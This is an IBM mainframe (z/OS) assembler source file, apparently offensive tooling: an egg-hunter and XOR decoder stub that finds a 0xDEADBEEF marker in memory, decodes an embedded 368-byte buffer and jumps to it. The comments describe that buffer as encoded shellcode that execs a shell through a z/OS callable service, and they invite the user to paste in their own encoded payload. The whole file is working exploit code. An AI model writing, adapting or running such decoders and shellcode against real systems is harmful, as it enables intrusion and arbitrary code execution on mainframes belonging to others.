         TITLE ' ./decoder.s                                           x 
                    aw yeah............'
         ACONTROL AFPR                    
EXEC@MIN CSECT                             
EXEC@MIN AMODE 31                           
EXEC@MIN RMODE ANY                           
         SYSSTATE ARCHLVL=2                   
         ENTRY MAIN
MAIN     DS    0F                              
** Begin setup and stack management **
         STM   14,12,12(13)   # store all the registers in old SP area
         LARL  15,*-4         # put base addr into R15 
         LR    12,15          # put given base addr into R12
         XR    1,1            # zeroout R1 for counting
         XR    2,2            # zeroout R1 for counting
         XR    3,3            # zeroout R3
         AFI   1,X'01010102'  # loading a 1 in R1 
         AFI   2,X'01010103'  # loading a 1 in R1 
         XR    1,2            # loading a 1 in R1
         LR    4,1            #  will put a 4 in R4
         SLA   4,1(1)         # make R1 == 4
         XR    10,10          # zeroout R10 for our egg
         XR    2,2            # zero 2
         LGFI  10,X'deadbeef' # load egghunter value into R10
         LR    11,12          # load  base int R11
LOOPER   AR    11,1           # add 1 to R11 
         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0
         CR    10,3           # compare egg with R11 mem pointer 
         BRC   7,LOOPER       # branch anything but equal
         AR    11,4           
         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0
         CR    10,3           # compare egg with R11 mem pointer 
         BRC   7,LOOPER       # 2nd check 2 in a row good to go!
         XR    2,2            # zero 2 for division
         XR    3,3            # zero 3 for division
         AR    11,1           # 1 for the offset from above
         SR    11,4           # 4 to skip last egg
         ST    13,4(,11)      # store old SP for later in wkg area
         ST    11,8(,13)      # store this in old wking area
         LR    13,11          # set up R13 pt to new wkg area
** End setup and stack management **
** Begin main decoding routine    **
         LR    3,11           # put egg addr in 5 - dont mod
         AR    3,4            # add 4 to 3
         AR    3,4            # add 4 to 3
         AR    3,4            # add 4 to 3 
         AR    3,4            # add 4 to 3 points to SC now
         LR    5,3            # put egg addr in 3
         SR    3,1            # dec R3 by 1 (for nulls)
         LR    4,1            # put 1 in R4
         XR    1,1            # zeroout R1
         XR    2,2            # zeroout R2
* put the XOR key  (enc buffer char) from below in the quotes below
         XI    1(3),X'06'     # xor byte with key (r3 offset by 1)
LOOP2    AR    1,4            # add 1 to R1
         ARK   2,3,1          # add r3 base to r1 counter yield r2 ptr
* put the XOR key  (enc buffer char) from below in the quotes below
         XI    1(2),X'06'     # xor byte with key
* put the buffer len (# of bytes) in the next cmd in CHI 1,<here>
         CHI   1,368          # to yield sc len
         BRC   4,LOOP2        # loop bwd 18 bytes if R1 < size
         XR    4,4
** Begin cleanup and stack management **
         L     13,4(4,11)     # reload old SP 
         BASR  14,5           # jmp to sc
** End main decoding routine    **
         DC    X'DEADBEEF'     #egg
         DC    X'DEADBEEF'     #egg + old sp
         DC    X'DEADBEEF'     #egg + nothing
         DC    X'DEADBEEF'     #egg + used by sc for save
*******************************************************************
* the following is shellcode that "execs" a shell using BP1EXC    *
* assembler callable service padded at the end with 00's to land  *
* on word boundaries                                              *
* the hex is then xor encoded with 0xff per byte to remove nulls  *
*   PASTE YOUR BUFFER AFTER HERE                                  *
*******************************************************************
*Buffer length:       736
*Number of bytes:     368
*Padding bytes:         4
*Enc buffer char:  0x6
*
*ASM buffer:
         DC    X'96ead60ac6f6f9f9f9f81e89c6b60606066056d6b6061edda10306X
               01c4d1e1f7c3e1c5460606c606f9f9f9fd11170c0e560686d25ef686X
               d2476687161e10477686da56766606477686e656766602477686ee56X
               76660e4776874e5676660a4796870656967606479687025696760247X
               96870e5696760e4776875e5676661647'
         DC    X'9686ea56967606479686eb56967602479686e95696760e4776870aX
               567666125676661e5676661a56766626567666225676662e5676662aX
               c6718606060656766636a16c060203e95ed6b6069eead60a11f901f8X
               060606060606060606060606060167848f9367a48e06060606050666X
               8567848f9367a48e4a678283a367a5a5'
         DC    X'ae0606060607060606040606061606060606060606060606060606X
               06060606060606060606060606060606060606060606060606060606X
               06060606060606060606060606060606060606060606060606060606X
               0606060606060606060606060606060606060606060606d8abb8e9f6X
               f6f6f6'
******************************************************************
*  PASTE YOUR BUFFER BEFORE HERE                                 *
*        Leave the below                                         *
******************************************************************
         DC    X'8BADF00D'   eof marker
         DC    X'8BADF00D'   eof marker
         DC    X'8BADF00D'   eof marker
         END
